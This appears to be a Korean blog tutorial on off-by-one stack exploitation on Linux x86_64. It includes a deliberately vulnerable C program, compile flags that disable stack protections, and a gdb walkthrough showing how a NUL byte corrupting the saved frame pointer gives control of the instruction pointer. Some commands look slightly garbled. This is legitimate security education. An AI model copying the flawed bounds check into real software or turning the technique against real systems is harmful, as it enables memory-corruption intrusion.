---
layout: post
title: "Linux x86_64 Shellcode 7"
date: 2014-11-10 22:28:09 +0900
comments: true
categories: 
---

#### Off-by-one

이제, size check 가 들어가는데 체크를 잘못해서, Off-by-one 에러가 날 경우를 정리해본다.

다음과 같은 체크가 들어간다고 한다.

    if (strlen(av[1])>512){
        printf("Buffer overflow attempt!\n");
        exit(1);
    }
    strcpy(buf,av[1]);

512 bytes 로 payload 를 맞추면, saved 된 `%rbp` 의 1 byte 를 0 으로 overwrite 할 수 있다.
saved 된 `%rbp` 는 사실 윗단계 depth 함수에서 사용하는 frame 포인터이다. 

function epilogue 에서 `leave` 를 해주면 `mov %rbp,%rsp` `pop %rbp` 를 해주면서 corrupt 된 rbp 값이 `%rbp` 에 세팅되고 return 하여, 이제 잘못된 `%rbp` 를 가지고 프로그램이 돌아간다.

`%rbp` 의 최하위 byte 가 0 가 되버려서 최대 255 bytes 만큼 lower address 로 떨어지게 된다.

    void b(char *s)
    {
        char buf[512];

        if (strlen(s) > 512) {
            printf("Buffer overflow attempt!\n");
            exit(1);
        }
        strcpy(buf,s); // 여기서 b() 스택프레임의 saved %rbp 가 깨지고
        // mov %rbp,%rsp; pop %rbp 에서 깨진 값이 %rbp 로 들어가고
    }
    void a(char *s)
    {
        b(s);
        // mov %rbp,%rsp; 에서 깨진 값이 %rsp 로 들어서 %rsp 가 망가지고
        // pop %rbp 를 거쳐서 
        // ret 에서 잘못된 return address 로 튀게 된다.
    }
    void main(int ac,char **av)
    {
        char buf[128];
        strcpy(buf,"dummy\x00");
        if (ac>1) a(av[1]);
    }

이제 컴파일해서 실행해보자.

    $ gcc -fno-stack-protector -zexecstack -f off off.c
    $ ./off $(printf "0513x" 0)
    Buffer overflow attempt!
    $ ./off $(printf "0512x" 0)
    Segmentation fault (core dumped)

에를 들어 `0x00007fffffffdc60` 가 saved ebp 였는데, 이게 buf[512] 랑 붙어있다가, 가장 가깝게 붙어 있던 0x60 이 0x00 으로 깨져버리면서, 이제 saved ebp 가 `0x00007fffffffdc00` 가 되버렸다.

a() 가 수행되고 나서 돌아갈 어드레스는 `0x00007fffffffdc60` 의 바로 위에 저장되어있었는데, 이제 a() 가 수행되고 나서 `0x00007fffffffdc00` 의 바로 위에 저장된 값을 return address 로 해서 튀게 된다.

a() 가 실행되고 나서 main() 으로 돌아가야하는데, 이제 엉뚱한대로 튀게 되는것. 

정리하면, `strlen(s) > 512-1` 이 아니라 `strlen(s) > 512` 라고 쓰는 바람에

* 로컬변수에 대해 작업하다가 1 byte 삑사리가 났다.
* 상단의 saved %rbp 가 깨진다. (상위함수 프레임 포인터)
* leaveq 에서, `pop %rbp` 때문에 이제 %rbp 레지스터 값이 깨진다.
* retq 로 상위함수로 돌아온다.
* 이제 남은 코드들이 깨진 %rbp 로 로컬 변수를 참조하게 된다.
* 이제 이 함수도 return 하게 되는데...
* leaveq 에서 `mov %rbp,%rsp` 때문에 이제 %rsp 레지스터 값이 깨진다.
* leaveq 에서 `pop %rbp` 를 해서 `%rsp += 8` 이 된다.
* retq 에서 %rsp 가 point 하는 메모리값으로 %rip 를 세팅하니 이번에는 %rip 가 깨진다.
* %rsp 가 최대 255 bytes 만큼 아래로 떨어지니, 우리가 컨트롤할 수 있는 변수 영역으로 %rsp 가 떨어질 가능성이 있다.
* 이렇게 되면 %rip 를 컨트롤 할 수 있을 가능성이 있다.

디스어셈블해보자.

    (gdb) disas
    Dump of assembler code for function a:
    0x4005fd <+0>:  push    %rbp            // 이전 frame 을 세이브하고
    0x4005fe <+1>:  mov     %rsp,%rbp       // 새로운 frame 을 셋업하고`
    0x400601 <+4>:  sub     $0x10,%rsp
    0x400605 <+8>:  mov     %rdi,-0x8(%rbp)
    0x400609 <+12>: mov     -0x8(%rbp),%rax
    0x40060d <+16>: mov     %rax,%rdi
    0x400610 <+19>: callq   0x400584 <b>
    0x400615 <+24>: leaveq
    0x400616 <+25>: retq

    (gdb) break b
    (gdb) run
    (gdb) break *0x4005f6 // strcpy() 에 브레이크를 건다.
    Breakpoint 2 at 0x4005f6: file off.c, line 8.
    (gdb) cont
    Continuing.

    Breakpoint 2, 0x4005f6 in b at off.c:8
    (gdb) p $rbp
    $1 = (void *) 0x7fffffffdd70
    (gdb) x $rbp // %rbp 가 가리키는 메모리에는 상위 스택프레임 %rbp 가 저장되어있다.
    0x7fffffffdd70: 0xffffdd90 // 상위 스택프레임 %rbp 는 0x7fffffffdd90
    0x7fffffffdd74: 0x00007fff
    (gdb) step // strcpy() 수행
    9       }
    (gdb) x $rbp 
    0x7fffffffdd70: 0xffffdd00 // 이제 0x7fffffffdd00 으로 깨졌다. 90 bytes 가 날아갔다. 다운.
    (gdb)
    0x7fffffffdd74: 0x00007fff
    (gdb) x 0x7fffffffdd08 // %rbp + 8 에 return address 가 저장되니까
    0x7fffffffdd08: 0x30303030 // 0x30 이 나오는 것으로 봐서 우리가 %rip 를 컨트롤 할 수 있다.
    (gdb) 
    0x7fffffffdd0c: 0x30303030
    (gdb)

return address 에 0x30 이 나오는 것으로 봐서 우리가 %rip 를 컨트롤 할 수 있다.

#### 결론

* 스택에 저장된 return address 까지가 아니더라도, saved %rbp 의 일부만 corrupt 시킬 수 있어도, %rip 를 컨트롤 할 수 있는 경우가 있다. 정도?

#### 참고

* [The poisoned NUL byte](http://seclists.org/bugtraq/1998/Oct/109)
* [Off-by-One exploitation tutorial](http://www.intelligentexploit.com/articles/Linux-Off-By-One-Vulnerabilities.pdf)
* [Third Generation Exploitation by Halvar Flake](https://www.google.co.kr/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#newwindow=1&q=halvar+flake+Third+generation+exploitation)
* [YouTube: Black Hat USA 2002 - Third Generation Exploitation](http://www.youtube.com/watch?v=ZLQ4x2CQ8fk)
* [Modeling the Exploitation and Mitigation of Memory Safety Vulnerabilities, Breakpoint 2012, Matt Miller, MSEC]()
* [Memory Corruption Exploitation in Internet Explorer, Moti Joseph]()
